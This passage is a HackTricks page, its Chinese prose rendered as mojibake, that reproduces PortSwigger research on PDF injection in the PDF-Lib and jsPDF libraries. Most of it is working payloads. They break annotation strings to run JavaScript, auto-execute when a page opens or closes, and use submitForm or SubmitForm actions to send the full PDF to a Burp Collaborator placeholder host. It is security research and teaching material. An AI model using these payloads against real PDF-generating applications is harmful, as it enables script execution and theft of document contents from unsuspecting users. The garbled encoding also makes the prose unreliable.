<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


**å¦‚æœæ‚¨çš„è¾“å…¥åœ¨PDFæ–‡ä»¶ä¸­è¢«åæ˜ ï¼Œæ‚¨å¯ä»¥å°è¯•æ³¨å…¥PDFæ•°æ®æ¥æ‰§è¡ŒJavaScriptæˆ–çªƒå–PDFå†…å®¹ã€‚**

ä»¥ä¸‹ä¿¡æ¯å–è‡ª [**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)

## PDF-Lib

è¿™æ¬¡ï¼Œæˆ‘ä½¿ç”¨äº† [PDFLib](https://pdf-lib.js.org)ã€‚æˆ‘èŠ±äº†ä¸€äº›æ—¶é—´ä½¿ç”¨è¿™ä¸ªåº“æ¥åˆ›å»ºä¸€ä¸ªæ³¨é‡Šï¼Œå¹¶çœ‹çœ‹æˆ‘æ˜¯å¦å¯ä»¥æ³¨å…¥ä¸€ä¸ªé—­åˆæ‹¬å·åˆ°æ³¨é‡Šçš„URIä¸­ - å®ƒå¥æ•ˆäº†ï¼æˆ‘ç”¨æ¥ç”Ÿæˆæ³¨é‡Šä»£ç çš„ç¤ºä¾‹æ˜“å—æ”»å‡»çš„ä»£ç æ˜¯ï¼š

`...`  \
`A: {`\
`Type: 'Action',`\
`S: 'URI',`\
``URI: PDFString.of(`injection)`),``\
`}`\
`})`\
`...`

[å®Œæ•´ä»£ç ï¼š](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

æˆ‘æ€ä¹ˆçŸ¥é“æ³¨å…¥æˆåŠŸäº†ï¼Ÿé™¤éæˆ‘æ³¨å…¥äº†ä¸€ä¸ªé—­åˆæ‹¬å·ï¼Œå¦åˆ™PDFä¼šæ­£ç¡®æ¸²æŸ“ã€‚è¿™è¯æ˜äº†é—­åˆæ‹¬å·æ‰“ç ´äº†å­—ç¬¦ä¸²è¾¹ç•Œï¼Œå¯¼è‡´PDFä»£ç æ— æ•ˆã€‚ç ´åPDFå¾ˆå¥½ï¼Œä½†æˆ‘éœ€è¦ç¡®ä¿æˆ‘å¯ä»¥æ‰§è¡ŒJavaScriptã€‚æˆ‘æŸ¥çœ‹äº†æ¸²æŸ“çš„PDFä»£ç ï¼Œæ³¨æ„åˆ°è¾“å‡ºä½¿ç”¨FlateDecodeè¿‡æ»¤å™¨è¿›è¡Œç¼–ç ã€‚æˆ‘å†™äº†ä¸€ä¸ªå°è„šæœ¬æ¥è§£å‹ç¼©å—ï¼Œæ³¨é‡Šéƒ¨åˆ†çš„è¾“å‡ºçœ‹èµ·æ¥åƒè¿™æ ·ï¼š`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

æ­£å¦‚æ‚¨å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°ï¼Œæ³¨å…¥å­—ç¬¦ä¸²ç”¨ä¸€ä¸ªé—­åˆæ‹¬å·å…³é—­äº†æ–‡æœ¬è¾¹ç•Œï¼Œè¿™ç•™ä¸‹äº†ä¸€ä¸ªç°æœ‰çš„é—­åˆæ‹¬å·ï¼Œå¯¼è‡´PDFæ¸²æŸ“ä¸æ­£ç¡®ï¼š

![åŠ è½½PDFæ—¶æ˜¾ç¤ºé”™è¯¯å¯¹è¯æ¡†çš„å±å¹•æˆªå›¾](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

å¤ªå¥½äº†ï¼Œæ‰€ä»¥æˆ‘å¯ä»¥ç ´åPDFçš„æ¸²æŸ“ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å‘¢ï¼Ÿæˆ‘éœ€è¦æƒ³å‡ºä¸€ä¸ªè°ƒç”¨JavaScriptçš„æ³¨å…¥ - PDFæ³¨å…¥çš„alert(1)ã€‚

å°±åƒXSSå‘é‡å–å†³äºæµè§ˆå™¨çš„è§£æä¸€æ ·ï¼ŒPDFæ³¨å…¥çš„å¯åˆ©ç”¨æ€§ä¹Ÿå¯èƒ½å–å†³äºPDFæ¸²æŸ“å™¨ã€‚æˆ‘å†³å®šé¦–å…ˆé’ˆå¯¹Acrobatï¼Œå› ä¸ºæˆ‘è®¤ä¸ºå‘é‡åœ¨Chromeä¸­ä¸å¤ªå¯èƒ½èµ·ä½œç”¨ã€‚æˆ‘æ³¨æ„åˆ°ä¸¤ä»¶äº‹ï¼š1ï¼‰æ‚¨å¯ä»¥æ³¨å…¥é¢å¤–çš„æ³¨é‡ŠåŠ¨ä½œå’Œ2ï¼‰å¦‚æœæ‚¨ä¿®å¤ç°æœ‰çš„é—­åˆæ‹¬å·ï¼Œé‚£ä¹ˆPDFå°†ä¼šæ¸²æŸ“ã€‚ç»è¿‡ä¸€äº›å®éªŒï¼Œæˆ‘æƒ³å‡ºäº†ä¸€ä¸ªå¾ˆå¥½çš„æœ‰æ•ˆè½½è·ï¼Œå®ƒæ³¨å…¥äº†ä¸€ä¸ªé¢å¤–çš„æ³¨é‡ŠåŠ¨ä½œï¼Œæ‰§è¡Œäº†JavaScriptï¼Œå¹¶ä¿®å¤äº†é—­åˆæ‹¬å·ï¼š`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

é¦–å…ˆæˆ‘æ‰“ç ´äº†æ‹¬å·ï¼Œç„¶åä½¿ç”¨>>æ‰“ç ´äº†å­—å…¸ï¼Œç„¶åå¼€å§‹ä¸€ä¸ªæ–°çš„æ³¨é‡Šå­—å…¸ã€‚/S/JavaScriptä½¿æ³¨é‡ŠåŸºäºJavaScriptï¼Œ/JSæ˜¯å­˜å‚¨JavaScriptçš„åœ°æ–¹ã€‚æ‹¬å·å†…æ˜¯æˆ‘ä»¬çš„å®é™…JavaScriptã€‚æ³¨æ„ï¼Œå¦‚æœæ‹¬å·æ˜¯å¹³è¡¡çš„ï¼Œä½ ä¸å¿…è½¬ä¹‰å®ƒä»¬ã€‚æœ€åï¼Œæˆ‘æ·»åŠ äº†æ³¨é‡Šçš„ç±»å‹ï¼Œå®Œæˆäº†å­—å…¸ï¼Œå¹¶ä¿®å¤äº†é—­åˆæ‹¬å·ã€‚è¿™å¤ªé…·äº†ï¼›æˆ‘å¯ä»¥åˆ¶ä½œä¸€ä¸ªæ‰§è¡ŒJavaScriptçš„æ³¨å…¥ï¼Œä½†é‚£åˆæ€æ ·å‘¢ï¼Ÿä½ å¯ä»¥æ‰§è¡ŒJavaScriptï¼Œä½†ä½ æ— æ³•è®¿é—®DOMï¼Œæ‰€ä»¥ä½ ä¸èƒ½è¯»å–cookiesã€‚ç„¶åJameså‡ºç°äº†ï¼Œå¹¶å»ºè®®ä»æ³¨å…¥ä¸­çªƒå–PDFçš„å†…å®¹ã€‚æˆ‘å¼€å§‹å¯»æ‰¾è·å–PDFå†…å®¹çš„æ–¹æ³•ã€‚åœ¨Acrobatä¸­ï¼Œæˆ‘å‘ç°ä½ å¯ä»¥ä½¿ç”¨JavaScriptæäº¤è¡¨å•è€Œä¸éœ€è¦ä»»ä½•ç”¨æˆ·äº’åŠ¨ï¼æŸ¥çœ‹JavaScript APIçš„è§„èŒƒï¼Œä¿®æ”¹åŸºç¡€æ³¨å…¥å¹¶æ·»åŠ ä¸€äº›JavaScriptï¼Œè¿™äº›JavaScriptå°†æŠŠæ•´ä¸ªPDFä»£ç çš„å†…å®¹é€šè¿‡POSTè¯·æ±‚å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨æ˜¯ç›¸å½“ç®€å•çš„ï¼š`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`\
`this.submitForm({`\
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`\
`/Type/Action>>/>>(`

ä¸éœ€è¦è­¦æŠ¥ï¼›æˆ‘åªæ˜¯æ·»åŠ å®ƒæ¥è¯æ˜æ³¨å…¥æ­£åœ¨æ‰§è¡ŒJavaScriptã€‚

æ¥ä¸‹æ¥ï¼Œåªæ˜¯ä¸ºäº†å¥½ç©ï¼Œæˆ‘çœ‹äº†çœ‹ä¸ä½¿ç”¨JavaScriptçªƒå–PDFå†…å®¹ã€‚ä»PDFè§„èŒƒä¸­ï¼Œæˆ‘å‘ç°ä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåä¸ºSubmitFormçš„åŠ¨ä½œã€‚æˆ‘è¿‡å»åœ¨Burp Suiteä¸­æ„å»ºPDFè¿›è¡Œæ‰«ææ£€æŸ¥æ—¶ä½¿ç”¨è¿‡å®ƒã€‚å®ƒç¡®åˆ‡åœ°åšäº†åå­—æ‰€æš—ç¤ºçš„äº‹æƒ…ã€‚å®ƒè¿˜åœ¨å­—å…¸ä¸­æœ‰ä¸€ä¸ªFlagsæ¡ç›®æ¥æ§åˆ¶æäº¤çš„å†…å®¹ã€‚Flagså­—å…¸é”®æ¥å—ä¸€ä¸ªæ•´æ•°å€¼ï¼Œä½†æ¯ä¸ªå•ç‹¬çš„è®¾ç½®éƒ½ç”±ä¸€ä¸ªäºŒè¿›åˆ¶ä½æ§åˆ¶ã€‚ä½¿ç”¨ES6ä¸­çš„æ–°äºŒè¿›åˆ¶æ–‡å­—å¤„ç†è¿™äº›è®¾ç½®æ˜¯ä¸€ä¸ªå¥½æ–¹æ³•ã€‚äºŒè¿›åˆ¶æ–‡å­—åº”è¯¥æ˜¯14ä½é•¿ï¼Œå› ä¸ºæ€»å…±æœ‰14ä¸ªæ ‡å¿—ã€‚åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œæ‰€æœ‰è®¾ç½®éƒ½è¢«ç¦ç”¨ï¼š`0b00000000000000`

è¦è®¾ç½®ä¸€ä¸ªæ ‡å¿—ï¼Œä½ é¦–å…ˆéœ€è¦æŸ¥æ‰¾å®ƒçš„ä½ä½ç½®ï¼ˆ[PDFè§„èŒƒ](https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf)çš„è¡¨237ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æƒ³è¦è®¾ç½®SubmitPDFæ ‡å¿—ã€‚ç”±äºè¿™æ˜¯ç”±ç¬¬9ä½æ§åˆ¶çš„ï¼Œä½ åªéœ€è¦ä»å³è¾¹æ•°9ä½ï¼š`0b00000100000000`

å¦‚æœä½ ç”¨JavaScriptè¯„ä¼°è¿™ä¸ªï¼Œç»“æœæ˜¯åè¿›åˆ¶å€¼256ã€‚æ¢å¥è¯è¯´ï¼Œå°†Flagsæ¡ç›®è®¾ç½®ä¸º256å°†å¯ç”¨SubmitPDFæ ‡å¿—ï¼Œè¿™å°†å¯¼è‡´æäº¤è¡¨å•æ—¶å‘é€PDFçš„å†…å®¹ã€‚æˆ‘ä»¬æ‰€éœ€è¦åšçš„å°±æ˜¯ä½¿ç”¨æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„åŸºç¡€æ³¨å…¥ï¼Œå¹¶ä¿®æ”¹å®ƒæ¥è°ƒç”¨SubmitFormåŠ¨ä½œè€Œä¸æ˜¯JavaScriptï¼š`/blah)>>/A<</S/SubmitForm/Flags 256/F(`\
`https://your-id.burpcollaborator.net)`\
`/Type/Action>>/>>(`

## sPDF

æ¥ä¸‹æ¥æˆ‘å°†æˆ‘çš„æ–¹æ³•åº”ç”¨åˆ°å¦ä¸€ä¸ªPDFåº“ - [jsPDF](https://parall.ax/products/jspdf) - å¹¶å‘ç°å®ƒä¹Ÿæ˜¯æ˜“å—æ”»å‡»çš„ã€‚åˆ©ç”¨è¿™ä¸ªåº“å¾ˆæœ‰è¶£ï¼Œå› ä¸ºä»–ä»¬æœ‰ä¸€ä¸ªå¯ä»¥åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œçš„APIï¼Œå…è®¸ä½ å®æ—¶ç”ŸæˆPDFï¼Œå½“ä½ è¾“å…¥æ—¶ã€‚æˆ‘æ³¨æ„åˆ°ï¼ŒåƒPDP-Libåº“ä¸€æ ·ï¼Œä»–ä»¬å¿˜è®°äº†åœ¨æ³¨é‡ŠURLså†…éƒ¨è½¬ä¹‰æ‹¬å·ã€‚è¿™é‡Œçš„urlå±æ€§æ˜¯æ˜“å—æ”»å‡»çš„ï¼š`doc.createAnnotation({bounds:`\
`{x:0,y:10,w:200,h:200},`\
``type:'link',url:`/input`});``\
`//vulnerable`

æ‰€ä»¥æˆ‘ä½¿ç”¨ä»–ä»¬çš„APIç”Ÿæˆäº†ä¸€ä¸ªPDFï¼Œå¹¶å°†PDFä»£ç æ³¨å…¥åˆ°urlå±æ€§ä¸­ï¼š

`var doc = new jsPDF();`\
`doc.text(20, 20, 'Hello world!');`\
`doc.addPage('a6','l');`\
`doc.createAnnotation({bounds:`\
`` {x:0,y:10,w:200,h:200},type:'link',url:` ``\
`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(`\
`` `}); ``

æˆ‘é€šè¿‡ç§»é™¤å­—å…¸çš„ç±»å‹æ¡ç›®å’Œä¸éœ€è¦çš„Fæ¡ç›®æ¥ç¼©å‡å‘é‡ã€‚ç„¶åæˆ‘ç•™ä¸‹äº†ä¸€ä¸ªæ‚¬ç©ºçš„æ‹¬å·ï¼Œå®ƒä¼šè¢«ç°æœ‰çš„æ‹¬å·å…³é—­ã€‚å‡å°‘æ³¨å…¥çš„å¤§å°å¾ˆé‡è¦ï¼Œå› ä¸ºä½ æ³¨å…¥çš„webåº”ç”¨ç¨‹åºå¯èƒ½åªå…è®¸æœ‰é™æ•°é‡çš„å­—ç¬¦ã€‚`/blah)>>/A<</S/JavaScript/JS(app.alert(1)`

ç„¶åæˆ‘å‘ç°å¯ä»¥è¿›ä¸€æ­¥å‡å°‘å‘é‡ï¼Acrobatå°†å…è®¸åœ¨ä¸€ä¸ªæ³¨é‡ŠåŠ¨ä½œä¸­æœ‰ä¸€ä¸ªURIå’Œä¸€ä¸ªJavaScriptæ¡ç›®ï¼Œå¹¶ä¸”ä¼šæ„‰å¿«åœ°æ‰§è¡ŒJavaScriptï¼š`/)/S/JavaScript/JS(app.alert(1)`

è¿›ä¸€æ­¥çš„ç ”ç©¶æ­ç¤ºï¼Œä½ è¿˜å¯ä»¥æ³¨å…¥å¤šä¸ªæ³¨é‡Šã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥æ‰“ç ´æ³¨é‡Šå¹¶å®šä¹‰è‡ªå·±çš„rectåæ ‡ï¼Œé€‰æ‹©æ–‡æ¡£çš„å“ªä¸ªéƒ¨åˆ†æ˜¯å¯ç‚¹å‡»çš„ã€‚ä½¿ç”¨è¿™ç§æŠ€æœ¯ï¼Œæˆ‘èƒ½å¤Ÿä½¿æ•´ä¸ªæ–‡æ¡£å¯ç‚¹å‡»ã€‚ `/) >> >>`\
`<</Type /Annot /Subtype /Link /Rect [0.00 813.54 566.93 -298.27] /Border [0 0`\
`0] /A <</S/SubmitForm/Flags 0/F(https://your-id.burpcollaborator.net`

## Executing annotations without interaction

åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘å±•ç¤ºçš„å‘é‡éœ€è¦ç‚¹å‡»æ¥æ¿€æ´»æ³¨é‡Šä¸­çš„åŠ¨ä½œã€‚é€šå¸¸ï¼ŒJamesé—®äº†ä¸€ä¸ªé—®é¢˜ï¼šâ€œæˆ‘ä»¬å¯ä»¥è‡ªåŠ¨æ‰§è¡Œå—ï¼Ÿâ€ã€‚æˆ‘æŸ¥é˜…äº†PDFè§„èŒƒï¼Œæ³¨æ„åˆ°æ³¨é‡Šçš„ä¸€äº›æœ‰è¶£ç‰¹æ€§ï¼š

"**PV** å’Œ **PI** æ¡ç›®å…è®¸åŒºåˆ†æ‰“å¼€çš„é¡µé¢å’Œå¯è§çš„é¡µé¢ã€‚åœ¨ä»»ä½•æ—¶å€™ï¼ŒæŸ¥çœ‹å™¨åº”ç”¨ç¨‹åºä¸­åªæœ‰ä¸€ä¸ªé¡µé¢è¢«è®¤ä¸ºæ˜¯æ‰“å¼€çš„ï¼Œè€Œæ ¹æ®é¡µé¢å¸ƒå±€ï¼Œå¯èƒ½æœ‰å¤šä¸ªé¡µé¢æ˜¯å¯è§çš„ã€‚"

æˆ‘ä»¬å¯ä»¥å‘å­—å…¸æ·»åŠ PVæ¡ç›®ï¼Œæ³¨é‡Šå°†åœ¨Acrobatä¸­è‡ªåŠ¨è§¦å‘ï¼ä¸ä»…å¦‚æ­¤ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åœ¨PDFæ–‡æ¡£å…³é—­æ—¶è‡ªåŠ¨æ‰§è¡Œæœ‰æ•ˆè½½è·ï¼Œä½¿ç”¨PCæ¡ç›®ã€‚æ”»å‡»è€…å¯ä»¥è¿½è¸ªä½ ä½•æ—¶æ‰“å¼€PDFå¹¶å…³é—­å®ƒã€‚

ä»¥ä¸‹æ˜¯å¦‚ä½•ä»æ³¨é‡Šä¸­è‡ªåŠ¨æ‰§è¡Œï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/)``\
`>> >>`\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Auto execute');`

å½“ä½ å…³é—­PDFæ—¶ï¼Œè¿™ä¸ªæ³¨é‡Šä¼šè§¦å‘ï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PC <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Close me');`

## Chrome

æˆ‘å·²ç»è°ˆäº†å¾ˆå¤šå…³äºAcrobatçš„å†…å®¹ï¼Œä½†PDFiumï¼ˆChromeçš„PDFé˜…è¯»å™¨ï¼‰å‘¢ï¼ŸChromeå¾ˆæ£˜æ‰‹ï¼›å®ƒçš„æ”»å‡»é¢æ›´å°ï¼Œå› ä¸ºå®ƒçš„JavaScriptæ”¯æŒæ¯”Acrobatçš„æ›´æœ‰é™ã€‚æˆ‘é¦–å…ˆæ³¨æ„åˆ°çš„æ˜¯ï¼Œæ³¨é‡Šä¸­æ ¹æœ¬æ²¡æœ‰æ‰§è¡ŒJavaScriptï¼Œæ‰€ä»¥æˆ‘çš„æ¦‚å¿µéªŒè¯ä¸èµ·ä½œç”¨ã€‚ä¸ºäº†è®©å‘é‡åœ¨Chromeä¸­èµ·ä½œç”¨ï¼Œæˆ‘è‡³å°‘éœ€è¦åœ¨æ³¨é‡Šä¸­æ‰§è¡ŒJavaScriptã€‚ä¸è¿‡ï¼Œæˆ‘é¦–å…ˆå†³å®šå°è¯•è¦†ç›–æ³¨é‡Šä¸­çš„URLã€‚è¿™å¾ˆå®¹æ˜“ã€‚æˆ‘å¯ä»¥ä½¿ç”¨æˆ‘ä¹‹å‰æƒ³å‡ºçš„åŸºç¡€æ³¨å…¥ï¼Œå¹¶ç®€å•åœ°æ³¨å…¥å¦ä¸€ä¸ªå¸¦æœ‰URIæ¡ç›®çš„åŠ¨ä½œï¼Œè¿™å°†è¦†ç›–ç°æœ‰çš„URLï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``\
``/Type/Action>>/F 0>>(`});``\
`doc.text(20, 20, 'Test text');`

è¿™å°†åœ¨ç‚¹å‡»æ—¶å¯¼èˆªåˆ°portswigger.netã€‚ç„¶åæˆ‘ç»§ç»­å°è¯•ä¸åŒçš„æ³¨å…¥æ¥è°ƒç”¨JavaScriptï¼Œä½†æ¯æ¬¡éƒ½ä¼šå¤±è´¥ã€‚æˆ‘è®¤ä¸ºè¿™æ˜¯ä¸å¯èƒ½çš„ã€‚æˆ‘é€€åä¸€æ­¥ï¼Œå°è¯•æ‰‹åŠ¨æ„é€ ä¸€ä¸ªå®Œæ•´çš„PDFï¼Œå®ƒå°†åœ¨Chromeä¸­ä»ç‚¹å‡»è°ƒç”¨JavaScriptï¼Œè€Œä¸æ˜¯æ³¨å…¥ã€‚å½“ä½¿ç”¨AcroFormæŒ‰é’®æ—¶ï¼ŒChromeå°†å…è®¸JavaScriptæ‰§è¡Œï¼Œä½†é—®é¢˜æ˜¯å®ƒéœ€è¦å¼•ç”¨PDFçš„éƒ¨åˆ†ã€‚æˆ‘è®¾æ³•åˆ¶ä½œäº†ä¸€ä¸ªæ³¨å…¥ï¼Œå®ƒå°†åœ¨JSPDFä¸Šä»ç‚¹å‡»æ‰§è¡ŒJavaScriptï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``\
`doc.text(20, 20, 'Click me test');`

æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œä¸Šé¢çš„å‘é‡éœ€è¦äº†è§£PDFç»“æ„ã€‚ \[ 3 0 R] æŒ‡çš„æ˜¯ä¸€ä¸ªç‰¹å®šçš„PDFå¯¹è±¡ï¼Œå¦‚æœæˆ‘ä»¬æ­£åœ¨è¿›è¡Œç›²ç›®çš„PDFæ³¨å…¥æ”»å‡»ï¼Œæˆ‘ä»¬ä¸ä¼šçŸ¥é“å®ƒçš„ç»“æ„ã€‚ä¸è¿‡ï¼Œä¸‹ä¸€æ­¥æ˜¯å°è¯•è¡¨å•æäº¤ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨submitFormå‡½æ•°æ¥å®ç°è¿™ä¸€ç‚¹ï¼Œå› ä¸ºæ³¨é‡Šéœ€è¦ç‚¹å‡»ï¼ŒChromeå°†å…è®¸å®ƒï¼š`) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.0 813.54 566.93 -298.27]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1);this.submitForm('https://your-id.burpcollaborator.net'))/Type/Action/F 4/DA(blah`

è¿™æœ‰æ•ˆï¼Œä½†å¾ˆæ··ä¹±ï¼Œå¹¶ä¸”éœ€è¦äº†è§£PDFç»“æ„ã€‚æˆ‘ä»¬å¯ä»¥å¤§å¤§å‡å°‘å®ƒï¼Œå¹¶å»é™¤å¯¹PDFç»“æ„çš„ä¾èµ–ï¼š`#) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0 0 889 792]/CA(Submit)>>/Rect [ 0 0 889 792]/Subtype/Widget/AP<</N <</Type/XObject/Subtype/Form>>>>/Parent <</Kids[ ]/Ff 65536/
